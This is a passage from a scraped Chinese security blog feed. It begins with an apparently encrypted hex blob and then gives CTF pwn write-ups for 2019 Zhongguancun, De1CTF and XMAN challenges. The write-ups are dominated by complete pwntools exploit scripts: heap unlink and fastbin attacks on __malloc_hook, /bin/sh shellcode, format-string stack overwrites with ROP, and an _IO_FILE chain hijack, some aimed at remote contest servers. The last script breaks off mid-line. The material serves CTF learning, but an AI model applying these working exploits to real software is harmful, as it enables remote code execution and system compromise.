3e072318168f50b1e6d9d733901ddc11ef81343d3afebeee46436861852a67a506cbd48a86588006fa55158bd6c4cae0ee382ebbade90f6af6c1885684f61661a1a74ddde2a067dbfb12835b5d687ee7ae5bbbbfdc62893f10e75a2d81dc1c9a713ca8a5c38f5c5459c476c9d5c364d593a5470b88a6043f83457770c47b2e41f093d6f1561591ffa26171a1b286212f5c330c0e1622c308cf9620b4b4e2cc29543d43096aff67f6f99a4f595a13672af840ef869acd9fc4778f8084f811563bee6f2a429389857db90126a06919489daa5f9bef443efff0e14c77e651f6a236f3c864c288be625926e958a0efa47f95b9c74ed8a412297d690c5e35a369f4a7154f7065decf426ff9376bac150c2f9d606cc88e7559ba2450389a54968a0e21609cbbd77565a979dd35e5741a864c2e687289c18632f8cefa0dafc4e0a505c37c261b9571835d3b9ceb04cce5d73b390d97f8e8d725cb2644a566fb31c742a1f2c5eba50578f00ba3a339c76fe623db15961e15d099242fac3f269d5e282242b48a23565d46e6c66584fceeea4aaf3ec452b4e908c1de9a45ce2d8933b4d7102b6c048afe8ce525b1fcd107a535446360d66ad93f09375dcfb4e011c5bc70d8a4e76dc6e41a30f40afc682c3a715e8e9206ec5f67742cfd111119a678920ba4cc89e363430d8287bc38873e56b8549c9b8b357411c0301888170ce1f16c22e8af3fe8e42cdfb882246cca4f046e9fe300ccf0b5ebbc67aa7f5095ae2952e68317f31c31c9e4af4cfaf474573f49eb03d709f87a4e7cf1833782340e38977d1d7ae3fc3dce91363b8d40270f13a40c08f50cee81e410f3947ad5c54bbb1c3c21165a0476be74d9f2e2ee6d10b59c79a8c3bf6582b9befeca30b4dc2b8cf096b94fba9012333fa90c86d4a0535db4300c058e90f4db76c7773ca460a5d5adc549e61c48e85dd3abd976558ebe3007e7f59aa4f7cc491f3b873166614b60a527a1ab92e441ce9e6c81870bec5d2a78f628a29f3e80d37be408719a098caa45dcbc9d16308e868e824b28b40596bfe0d287845258d330d6633ae71d37e488c57440152d3342b815e2bd55e36877a1dc851951e3c5f69dc67d7a7818ac2848a1e91972fa19c283d9b191d461e823ef1700294fa8d1329d6cf84cf75d81e800d7dd42070aef4b4083c3f435bdd4c227f6284b50bb6a653c12751f31014729cf500b8504faa46af22b837798e88b2187a546dc8b506bd1d5bb57f8ea5fa4999bdd98765ce8d97ee0746396341712663d861d17df24d174be23cf4c5c998cd9bf0126c410ec064b4d2e53cda859c49678c2f93a158a519eccf13bf9f5716bea8c622408f1f451d5e1f17546cd0ae5fbf85803bcb6c0703c930be3d0b20cb4dd6c0a0138f7c6cb36040a44c0887fb4e3955e0742217a39b6733db25bf7e20421c01b11caf72e0cedaa8af4df19d8087d5e3e9463a3916409207bd3ab3f69644461862f8a719f0dcca99763122fa8c38bd831b52aa9e695f4534067fc50b95b67bac5ff05158bc5be0953a29ffa5f51e0dd4bc5bac6b801eedd37ed63f243af1868db6789f55116fee44290b1365d56aa7db86010c69681ae8e8b903587450b0e906d47ac235ad69cfe9722c9808e09bb4b2afc47154e7777f752e04837322e9088f00653a83bb026c7c70b612d2f61e9dd68994a57fa64fc6744d1fa66f8f60a2962dbc6f43f25bf7a90adf39c928a7d527e24a59267b0bf855627650b314c3adbd4559d857caa4aa8a90ad521844844e91b480d092073beed72e3d6dca1117cb4067e58b5b3b5ff8ea9f078e70e6263fe65ba071caa215397b79d3847e48ff103228a12a59aae43c388c9395180c0ec063af4e2d2cf09525a73327169ff833c91e79503ce15b04f3ddeff75b1799e77ca26fb9dfa98810201bdb7eb3dd352d72b5252f0bb3c9bd64dd84a705dd44635cb6e60f3d4417ec7eb68013ebd312e3c1b75135d91de5ae052ec21e180039dd99ab878f80822c363ed705369f34527323ad439708000f61992432c676516c85086886077050b20abff0028108b44a22010d8a4d3093b4ddb38f6029049a4cbc334f4c34eb28212631cf09f5837eb8d2d07eca1b6a6bea99f5000ea93bc004280f206fdbf398fc9e1bf353f9786eb303cbed78e0f081b022fb0b94114509f995fb8661576876b7e87491c8c54b6e1e257c26f486587380947a99220ebfc5a1326104c82d67ddc16790aa8e418b340ace1c37677746bff0ea8eae91692fe2a8346eb1ac93fc4aa6b0322c2047ef4a28437f153c2ee2aa8f680931578cd758cb7ad33d4efe8f16dc0a67822d14e2816421a027224009edd2a96b94b4d798adff39139a68d04c51388b55944e90bcf75b67f9cdbb5431a45116822d3e495fd20e832f96b4a09ecffc777c8bd22861870d74c3aa9f53b6303c1c500d21b93aec8ad53b1cda28791a6f6edb4d3c45b77cbc7f340c2309c5131e6fb1518d2cd3b2b1a27a4f182e28385de0ebfb13829160134d940ca93b3e3648564292d5fc3a4066477e5a917d2f1897a3f9f7b50415f912e3a30c313679af15764fa3eca878dc8efae1780eeee711af0689920307293fbc5c4256847b34ff67ddda955774584a2e90d2b2949e6e2557381ddf659cdf3cdacd7dc1deedc6908508dfa12fe34fba65c8d71dc7bd52bd26107f37fd0eeb27f0ba5f4e4437a171fbadc937707efab82d7388a9266b551d16d7cd3807b226170bc3342bf38905a74bb3125fe0cb8ec52db2fd653de3899b68cbfc78c017358fc9f449553493d6818c0fc8fc9e3afa5648c8fc0f79da39ccda718970c242a45c70170836f406c9f06e09121358cfceb66673b4a67b4e034435e7f7aa969d853924739250bf041a7ff877415886b6a163aa59eb5d6ca80656b5abf40c3af66038d61c350216fa59a98676eeb56187d5dbe4247ca903e47b728f74f562d4d675a1f49b8b]]></content>
      <categories>
        <category>私人空间</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019中关村信息安全专项赛]]></title>
    <url>%2F2019%2F08%2F16%2F2019%E4%B8%AD%E5%85%B3%E6%9D%91%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E9%A1%B9%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[one_string:一道静态编译的32位堆题，被队长直接秒了一血orz，我等渣渣只能跟在屁股后面打打本地艰难生存这样子。。。。 漏洞和利用思路：漏洞点在于strlen造成的溢出。 逆向可能有点点难度。。。确定好各个函数，然后思路就很明了了，所有的保护都没开，还有chunklist，unlink为第一选择技巧，成功以后可以任意写，把一个chunk_ptr改为mmap地址，接着往mmap地址处注入shellcode，再把一个chunk_ptr改为malloc_hook，然后把malloc_hook改为mmap地址即可。远程有点坑，我当时交互似乎出现了问题，没有接收到他输出的字符串信息。。。。 自己的exp，本地打通：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('df0a72047d6c.gamectf.com',10001)def new(size,content): #raw_input() sleep(0.1) p.sendline('1') #raw_input() sleep(0.1) p.sendline(str(size)) #raw_input() sleep(0.1) p.send(content)def delete(index): sleep(0.1) p.sendline('2') sleep(0.1) p.sendline(str(index))def upgrade(index,content): sleep(0.1) #raw_input() p.sendline('3') sleep(0.1) #raw_input() p.sendline(str(index)) #raw_input() sleep(0.1) p.send(content)#p.recvuntil('input:\n')new(0x30,'\x01'*0x30) #0new(0x10,'\x01'*0x10) #1 0x100new(0x10,'\x02'*0x10) #2 0x200new(0x14,p32(0x03030303)+p32(0x18)+p32(0x080eba40+0xc-0xc)+p32(0x080eba40+0xc-8)+'\x03'*0x4) #3new(0x58,p32(0x18)+'\x04'*0x54) #4new(0x10,'\x05'*0x10) #5#gdb.attach(p)upgrade(3,p32(0x03030303)+p32(0x03030303)+p32(0x080eba40+0xc-0xc)+p32(0x080eba40+0xc-8)+'\x03'*0x4)upgrade(3,p32(0x03030303)+p32(0x18)+p32(0x080eba40+0xc-0xc)+p32(0x080eba40+0xc-8)+p32(0x10)+'\x60')delete(4)shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"upgrade(3,p32(0x080eb110)+'\n')upgrade(0,shellcode+'\n')upgrade(3,p32(0x080EA4D8))upgrade(0,p32(0x080eb110)+'\n')#gdb.attach(p)new(0x10,'\n')if attach == 1: gdb.attach(p)p.interactive() 队长exp，远程:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *import base64context.log_level = 'debug'context.terminal = ['tmux', 'split', '-h']def add(p, size, content): payload = (str(1) + '\n') payload += (str(size) + '\n') if size == len(content): payload += (content) else: payload += (content + '\n') return payloaddef delete(p, idx): payload = (str(2) + '\n') payload += (str(idx) + '\n') return payloaddef edit(p, idx, content): payload = (str(3) + '\n') payload += (str(idx) + '\n') payload += (content) return payloaddef pwn(): DEBUG = 0 if DEBUG == 1: p = process('./pwn') else: p = remote('df0a72047d6c.gamectf.com', 10001) if DEBUG == 1: gdb.attach(p) p.sendlineafter('token:\n', 'icq16d3378b212336b61cfd024813f31') malloc_hook = 0x80EA4D8 p.recvuntil('So, please give me a base64 strings:\n') b64string = '' b64string += add(p, 0x100-4, 'sunichi') b64string += add(p, 0x100-4, 'sunichi') for i in range(10): b64string += add(p, 0x2c, 'sunichi') b64string += add(p, 0x30, 'sunichi') b64string += edit(p, 0, 'a' * (0x100-4)) payload = 'a' * (0x100-4) + '\x31\x01' b64string += edit(p, 0, payload) b64string += delete(p, 1) b64string += add(p, 0x100-4, 'sunichi') b64string += add(p, 0x2c, 'sunichi') b64string += delete(p, 2) b64string += delete(p, 3) b64string += delete(p, 13) b64string += add(p, 0x2c, p32(0x80eba30-4)) b64string += add(p, 0x2c, 'sunichi') b64string += add(p, 0x2c, 'sunichi') b64string += add(p, 0x2c, p32(0xdeadbeef) * 3 + p32(malloc_hook) + p32(0x080eb800)) shellcode = asm(shellcraft.i386.linux.sh()) b64string += edit(p, 1, shellcode + '\n') b64string += edit(p, 0, p32(0x080eb800) + '\n') b64string += add(p, 0x80, 'cat /flag') p.sendline(base64.b64encode(b64string)) #flag&#123;d56e5fc7d384ee7e4661178d17ca25b9&#125; p.interactive() p.close()if __name__ == '__main__': pwn() two_string:漏洞和思路分析：漏洞点在于再拼接十个字符串时，未检查size的大小，可以导致整数溢出，进而导致堆溢出。需要耐下心来慢慢构造chunk。 还有一个鬼畜的点在于index的检查有问题，但是没有卵用，泄露不了程序基址的话没法利用。 远程Libc版本为2.24，找Libc可以利用pwntools： 12&gt; `libcdb.search_by_md5('cfcef452ef69ea2dd73d6f55d7607c2b')`&gt; 队长exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149from pwn import *import base64context.log_level = 'debug'context.terminal = ['tmux', 'split', '-h']def add(p, size, content): p.sendlineafter('&gt;&gt;&gt; ', '1') p.sendlineafter('Please enter the size of string : ', str(size)) if size == len(content): p.sendafter('Please enter the string : ', content) else: p.sendlineafter('Please enter the string : ', content)def show(p, idx): p.sendlineafter('&gt;&gt;&gt; ', '2') p.sendlineafter('Please input index : ', str(idx))def delete(p, idx): p.sendlineafter('&gt;&gt;&gt; ', '3') p.sendlineafter('Please input index : ', str(idx))def merges(p, payload): p.sendlineafter('&gt;&gt;&gt; ', '5') p.sendlineafter('Please enter a sequence of strings to be merged : ', payload) def pwn(): DEBUG = 0 lib_version = 24 if DEBUG == 1 and lib_version == 23: p = process('./pwn') libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') elif DEBUG == 1 and lib_version == 24: p = process('./pwn', env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) libc = ELF('./libc.so.6') else: p = remote('a32f094e35d7.gamectf.com', 20001) libc = ELF('./libc.so.6') if DEBUG == 1: gdb.attach(p) # leak heap addr add(p, 0x10, 'sunichi') add(p, 0x10, 'sunichi') delete(p, 0) delete(p, 1) p.sendlineafter('&gt;&gt;&gt; ', '1') p.sendlineafter('Please enter the size of string : ', str(0)) #0 show(p, 0) p.recvuntil('Notes are : ') recv = p.recv(6) + '\x00\x00' heap_base = u64(recv) - 0x40 #leak libc base add(p, 0x100, 'sunichi') #1 add(p, 0x40, 'sunichi') #2 delete(p, 1) add(p, 0x10, 'sunichi') #1 p.sendlineafter('&gt;&gt;&gt; ', '1') p.sendlineafter('Please enter the size of string : ', str(0)) #3 show(p, 3) p.recvuntil('Notes are : ') recv = p.recv(6) + '\x00\x00' if DEBUG == 1 and lib_version == 23: libc.address = u64(recv) - (0x00007f2cc07cab78 - 0x00007f2cc0406000) else: libc.address = u64(recv) - (0x00007fd07662db58 - 0x00007fd07626c000) add(p, 0x800, '') #4 add(p, 0x800, 'a' * 0x428) #5 merges(p, '4' + ' 4' * 7) #6 0x4000 merges(p, '5' + ' 4' * 7) #7 delete(p, 4) delete(p, 5) merges(p, '6' + ' 6' * 7) #4 0x20000 merges(p, '7' + ' 6' * 7) #5 delete(p, 6) delete(p, 7) merges(p, '4' + ' 4' * 7) #6 0x100000 merges(p, '5' + ' 4' * 7) #7 delete(p, 4) delete(p, 5) merges(p, '6' + ' 6' * 7) #4 0x800000 merges(p, '7' + ' 6' * 7) #5 delete(p, 6) delete(p, 7) merges(p, '4' + ' 4' * 7) #6 0x4000000 merges(p, '5' + ' 4' * 7) #7 delete(p, 4) delete(p, 5) merges(p, '6' + ' 6' * 7) #4 0x20000000 merges(p, '7' + ' 6' * 7) #5 add(p, 0xf8, '\x61') #8 add(p, 0x400, '') #9 add(p, 0x10, '') #10 delete(p, 10) add(p, 0x68, 'a' * 0x18 + p64(0x51)) #10 add(p, 0x68, '') #11 delete(p, 9) delete(p, 0) delete(p, 2) merges(p, '4 4 4 4 4 4 4 5 8') delete(p, 11) delete(p, 10) payload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x71) + p64(libc.symbols['__malloc_hook'] - 0x13) add(p, 0x58, payload) delete(p, 1) add(p, 0x68, '') if DEBUG == 1 and lib_version == 23: add(p, 0x68, '\x00\x00\x00' + p64(libc.address + 0xf1147)) elif DEBUG == 0 or (lib_version == 24): add(p, 0x68, '\x00\x00\x00' + p64(libc.address + 0xf2519)) print hex(libc.address) print hex(heap_base) #flag&#123;458a6246278b42eef7f6a2f36cb4f830&#125; p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019De1CTF/magic_exit]]></title>
    <url>%2F2019%2F08%2F12%2F2019De1CTFmagic_exit%2F</url>
    <content type="text"><![CDATA[唉，好久没打比赛了，这次2019DelCTF打的让我深深地自闭，真的太菜了orz。就做出来签到题。 玩高端纯技巧的unprintable我看了一天，大致可以猜到一点思路，但还是没做出来。mimic_note队里大佬拿了三血，拟态防御之前在强网杯线上见过一次，还没搞得太懂，也没做出来。其他的要么是和web结合的，要么是内核。。。打的一脸懵逼。 题目自取：2019DelCTF Weapeon中下端纯技巧题，pwn签到题。 程序就不分析了，大家都看得懂，因为size限制在了fastbin内，所以我们想向_IO_2_1_stdout分配chunk必须利用partial overwrite,首先想怎么获取unsortedbin的chunk，emmmm，思路有两种，一种是scanf()函数自带漏洞，其会在堆上分配chunk当作缓冲区，输入完毕后再free，所以若我们输入大数据，程序内部会进行隐藏的malloc_consolidate，把fastbin进行合并，后续就都是套路了。第二种是用uaf，进行fastbinattack，释放伪造的size在unsortedbin范围内的chunk。 exp11234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',timeout=1,terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('139.180.216.34',8888)def new(size,index,content): p.recvuntil('&gt;&gt; \n') p.sendline('1') p.recvuntil('weapon: ') p.sendline(str(size)) p.recvuntil('index: ') p.sendline(str(index)) p.recvuntil('name:\n') p.send(content)def delete(index): p.recvuntil('&gt;&gt; \n') p.sendline('2') p.recvuntil('idx :') p.sendline(str(index))def upgrade(index,content): p.recvuntil('&gt;&gt; \n') p.sendline('3') p.recvuntil('idx: ') p.sendline(str(index)) p.recvuntil('content:\n') p.send(content)def pwn(): new(0x60,0,'\x00'*0x60) new(0x60,1,'\x11'*0x60) new(0x60,2,'\x22'*0x60) new(0x60,3,'\x33'*0x60) delete(0) delete(1) delete(2) p.recvuntil('&gt;&gt; \n') p.sendline('1'*0x500) new(0x60,0,'\xdd\x45') new(0x60,1,'\x11'*0x60) delete(1) delete(3) upgrade(3,'\x00') new(0x60,2,'\x22'*0x60) new(0x60,4,'\x44'*0x60) new(0x60,5,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00') p.recv(0x40) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f5e758c4600-0x7f5e754ff000) log.success('libcbase = '+hex(libcbase)) target = libcbase+(0x7f41e4643b20-0x7f41e427f000)-0x33 new(0x60,0,'\x00'*0x60) delete(0) upgrade(0,p64(target)) one_gadget = [0x4526a,0x45216,0xf02a4,0xf1147] new(0x60,1,'\x00') new(0x60,2,'\x00'*0x13+p64(libcbase+one_gadget[2])) delete(2) if attach == 1: gdb.attach(p) p.interactive()while True: try: pwn() break except: p.close() if debug == 0: p = process(path) else: p = remote('139.180.216.34',8888) exp2(来自17学长)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *context.log_level = 'debug'#context.terminal = ['tmux', 'split', '-h']def add(p, idx, size, content): p.sendlineafter('choice &gt;&gt; ', str(1)) p.sendlineafter('wlecome input your size of weapon: ', str(size)) p.sendlineafter('input index: ', str(idx)) p.sendafter('input your name:', content)def delete(p, idx): p.sendlineafter('choice &gt;&gt; ', str(2)) p.sendlineafter('input idx :', str(idx)) def edit(p, idx, content): p.sendlineafter('choice &gt;&gt; ', str(3)) p.sendlineafter('input idx: ', str(idx)) p.sendafter('new content:', content)def pwn(): DEBUG = 1 if DEBUG == 1: p = process('./pwn') #gdb.attach(p) else: p = remote('139.180.216.34', 8888) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') add(p, 0, 0x60, 'sunichi'.ljust(0x58, '\x00') + p64(0x70)) add(p, 1, 0x60, 'sunichi') add(p, 2, 0x60, 'sunichi') add(p, 3, 0x60, 'sunichi') add(p, 4, 0x60, 'sunichi') add(p, 7, 0x60, 'sunichi') add(p, 8, 0x60, 'sunichi') add(p, 9, 0x60, 'sunichi') delete(p, 0) delete(p, 2) edit(p, 2, '\x60') add(p, 2, 0x60, 'sunichi') add(p, 5, 0x60, p64(0) + p64(0x70+0x71)) delete(p, 1) edit(p, 5, p64(0) + p64(0x71) + '\xdd\x25') delete(p, 0) delete(p, 3) edit(p, 3, '\x70') add(p, 3, 0x60, 'sunichi') add(p, 1, 0x60, 'sunichi') payload = '\x00\x00\x00' + 6 * p64(0) + p64(0xfbad1800) + p64(0) * 3 + '\x00' add(p, 6, 0x60, payload) p.recvuntil(p64(0xfbad1800) + p64(0) * 3) recv = p.recv(8) libc.address = u64(recv) - (0x00007ffff7dd2600 - 0x00007ffff7a0d000) delete(p, 8) edit(p, 8, p64(libc.symbols['__malloc_hook'] - 0x13)) add(p, 8, 0x60, 'sunichi') add(p, 8, 0x60, '\x00\x00\x00' + p64(libc.address + 0xf02a4)) delete(p, 9) delete(p, 9) print hex(libc.address) p.interactive() p.close()if __name__ == '__main__': pwn() unprintableemmm，这题是pwnable.tw上的400p的printable的变式，当时就已经猜到（毕竟这么相似），但是printable也不会做orz，队里大佬也没有做过这题，但是看这题的意思是想让我们在exit()里进行大量的骚操作来控制程序执行流，唉，exit()函数一直是我觉得姿势比较多，但是又一直没深入跟一遍的函数，正好靠这次机会跟一遍几个调用链，深入才是pwn的本质与有趣之处。 si单步跟进，发现大部分的操作都是在__run_exit_handlers里实现的，在__run_exit_handlers+230处，函数通过call rdx，进入了_dl_fini函数，这里看rdx的来源，发现几乎是不具有可控性的。（可以自己跟着看一下）。 继续跟，进入_dl_fini，发现在_dl_fini+126处有一处调用，调用了一个函数指针，这里的调用存在可控性，也确实有题目出过这个点（2018HCTF-the-end，有兴趣可以看一下），我们若更改这个函数指针为one_gadget就可以劫持程序执行流，但是这一题中不行。 继续跟进，在_dl_fini+686处有一个类似的点。 我们继续跟进，到了_dl_fini+819，我们发现这里的rdx固定为0，r12来源如下图，我们又惊喜地发现，r12初始值是fini_array的地址，rbx竟然是栈上偏移位置为26的那个指针（因为我是分两次截的图，所以数值不一样），所以我们改这个指针来控制程序返回到0x4007a3，继续read，printf。（之后的exit的调用链大多就是文件方面的了，我会在下一题的2019xman夏令营的一道题来继续跟进。） 返回成功时如下： 第二次调用printf时，栈环境已经发生了变化，我们可以发现在偏移23处存放的是指向printf的返回地址的指针。 我们利用格式化字符串更改其值来继续返回到0x4007a3。之后可以无限的read，printf。再利用格式化字符串任意栈地址写，将返回地址之后的那个地址写为bss段的地址，之后的思路就是利用pop rsp劫持栈到bss段，然后rop，最后系统调用打开shell。找syscall这个gadget这个操作还是蛮骚的。。。我们调用一次puts，其实际上没什么卵用，但是其会在bss段上（栈）残留libc地址，我们可以再利用partial overwrite来使syscall的地址出现在bss段上。 exp如下这个exp参考了官方的和学长的，官方最后的那个gadget实在太**，自己体会：传送门 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#coding:utf-8from pwn import *debug=1context(arch='amd64',os='linux')context.log_level='debug'context.terminal = ['terminator','-x','sh','-c']if debug == 1: p = process('./unprintable') P = ELF('./unprintable')else: p=remote('',)def ru(x): return p.recvuntil(x)def se(x): p.send(x)def wait(x=True): #raw_input() sleep(0.3)def write_addr(addr,sz=6): t = (stack+0x40)%0x100 v = p64(addr) for i in range(sz): if t+i != 0: se('%'+str(t+i)+'c%18$hhn%'+str(1955-t-i)+'c%23$hn\x00') else: se('%18$hhn%1955c%23$hn') wait() tv = ord(v[i]) if tv != 0: se('%'+str(tv)+'c%13$hhn%'+str(1955-tv)+'c%23$hn\x00') else: se('%13$hhn%1955c%23$hn') wait()def write_value(addr,value,addr_sz=6): write_addr(addr,addr_sz) se('%'+str(ord(value[0]))+'c%14$hhn%'+str(1955-ord(value[0]))+'c%23$hn\x00') wait() ta = p64(addr)[1] for i in range(1,len(value)): tmp = p64(addr+i)[1] if ta!=tmp: write_addr(addr+i,2) ta = tmp else: write_addr(addr+i,1) if ord(value[i]) !=0: se('%'+str(ord(value[i]))+'c%14$hhn%'+str(1955-ord(value[i]))+'c%23$hn\x00') else: se('%14$hhn%1955c%23$hn\x00') wait()part1 = 0x40082apart2 = 0x400810def call_fun(fun_addr,arg1,arg2,arg3): payload = p64(part1) payload+= p64(0) payload+= p64(1) payload+= p64(fun_addr) payload+= p64(arg3) payload+= p64(arg2) payload+= p64(arg1) payload+= p64(part2) payload+= '\x00'*0x38 return payloadbuf = 0x601060+0x100+4ru('This is your gift: ')stack = int(ru('\n'),16)-0x118if stack%0x10000 &gt; 0x2000: p.close() exit()ret_addr = stack - 0xe8log.success('ret_addr = '+hex(ret_addr))log.success('stack = '+hex(stack))se('%'+str(buf-0x600DD8)+'c%26$hn'.ljust(0x100,'\x00')+p64(0x4007A3))sleep(1)gdb.attach(p)se('%'+str(0xa3)+'c%23$hhn\x00')wait()rop = 0x601060+0x200write_value(stack,p64(rop)[:6])p_rbp = 0x400690 #0x0000000000400690: pop rbp; ret;p_rsp = 0x40082d #0x000000000040082d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; retp_rdi = 0x400833 #0x0000000000400833: pop rdi; ret;payload1 = p64(0)*2 + '/bin/sh\x00'payload1+= call_fun(P.got['read'],0,0x601800,0x800)payload1+= p64(p_rdi)+p64(0x601060)+p64(P.plt['puts'])payload1+= p64(p_rsp)+p64(0x601800-0x18)p.send(('%'+str(0x82d)+'c%23$hn').ljust(0x200,'\x00')+payload1)raw_input()payload2 = call_fun(P.got['read'],0,0x601260+0x18,1)payload2+= call_fun(P.got['read'],0,0x601060,59)payload2+= call_fun(0x601260+0x18,0x601260+0x10,0,0)p.send(payload2)raw_input()p.send('\xac')raw_input()p.send('\x00'*59)raw_input()p.sendline('/bin/sh 1&gt;&amp;2')p.interactive()p.close() 2019XMAN夏令营某道题这题是广州大学的一个大佬给我的，我断断续续，连看之前类似的题，连向学长求助，做了一天多才调出来。。感觉还是有东西的。。。感觉像是2018bctf的three和defconchina的echos的结合版。。。 之前尝试了三种方法，fastbin_attack，chunk overlapping，伪造top_chunk_size都失败了，都是出在一个问题上：一旦mmap的地址出来以后，所有的chunk（除非极大，mmap的空间不够）都会从mmap分配和归还，所有的bins都报废了，感觉源码还是啃得不够深。。。。 这里说一下大致思路，大家跟一下exp就能很好的理解，主要想跟一下exit()。看看_IO_clean_up的调用链和_IO_flush_all_lockp的执行流。 思路leak我当时还被leak迷住了一会。。大脑抽了。。new，delete，new，view，即可泄露出libc和heap地址。 控制程序执行流漏洞点在于当你申请极大size的chunk时，malloc会返回0，所以chunk_ptr+size-1=0这条指令就相当于任意大地址（size-1）写0字节，且次数不限。这里选用的是改top_chunk_addr（main_arena+88）的最后一个字节为0，使其变为我们伪造的size（注意，这个size是我们精心伪造的），但是之前说了之后的bins会全部废掉，所以我们只能分配极大chunk，让其从topcchunk里分配，因为mmap分配的chunk对我们来说没有任何价值。且我们只有一次机会（之后若再分配极大chunk会到没有权限的地址上），所以思路是利用这一次分配劫持程序执行流。 又看到程序的4选项是调用exit()，所以想到可能与文件结构体有关，所以想到利用_IO_flush_all_lockp来劫持程序执行流。篡改stdout或stderr或stdin文件结构体的chain位为我们在堆上伪造的_IO_FILE，再调用_IO_overflow时伪造为调用system。这里跟一下最后的过程： 跟进exit来具体调试看一下exit是怎么调用的这个函数： 接着上面的unprintable继续跟进，我们发现程序走出了_dl_fini，返回了__run_exit_handlers，继续跟进，在__run_exit_handlers+136处调用了_IO_cleanup。 继续单步进入_IO_cleanup，发现在_IO_cleanup+36处调用了_IO_flush_all_lockp。 在这里我们先来看一下_IO_flush_all_lockp的源码来搞清他的基本逻辑，汇编可读性还是太差。 _IO_flush_all_lockp的源码如下： 12345678910111213141516171819202122232425262728293031323334int _IO_flush_all_lockp (int do_lock)&#123;...... last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; //_IO_list_all赋给fp while (fp != NULL) &#123;...... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)//需要bypass的条件#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))//需要bypass的条件#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)//改 _IO_OVERFLOW 为 system 劫持程序流！ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else fp = fp-&gt;_chain; //我们篡改stderr的chain为heap，劫持下一个fp到伪造的_IO_FILE &#125;......&#125; 由于逻辑短路原则，想要调用后面的_IO_OVERFLOW (fp, EOF)，前面的条件必须满足，即： 1234561.fp-&gt;_mode &lt;= 02.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base或1._IO_vtable_offset (fp) == 02.fp-&gt;_mode &gt; 03.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base （我这里用的第一种。。。） 这个函数的基本逻辑就是先从_IO_list_all开始，逐个清理_IO_FILE，若是满足上面的条件之一的就会调用vtable里的_IO_OVERFLOW函数来清理残留的缓冲区等内存空间。然后通过chain位寻找下一个_IO_FILE，直到chain为0为止。 在一个正常的程序里，_IO_FILE的连接顺序是_IO_list_all=&gt;_IO_2_1_stderr=&gt;_IO_2_1_stdout=&gt;_IO_2_1_stdin=&gt;0。我们的思路是把_IO_2_1stderr的chain伪造为heap上的fake_IO_FILE，下图为已经篡改好的，本来0x5630fa2b2011位置的值应该是_IO_2_1_stdout的首地址。 看一眼heap上的伪造的_IO_FILE： 我们继续跟进，因为正常的_IO_FILE是不会有_IO_OVERFLOW的调用过程的，所以跳的还是蛮快的。在_IO_flush_all_lockp+356位置，我们看到已经开始准备参数了，此时rbx里装的是fake_IO_FILE的首地址，执行完这条指令之后，rax里装的就是fake_vtable的值了。 之后终于在_IO_flush_all_lockp+371处调用了_IO_OVERFLOW，因为他是根据vtable的偏移来找的，所以直接会调用system。参数又是addr_/bin/sh，所以直接get shell！！！ exp如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#coding:utf-8from pwn import *path = './pwn2'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = 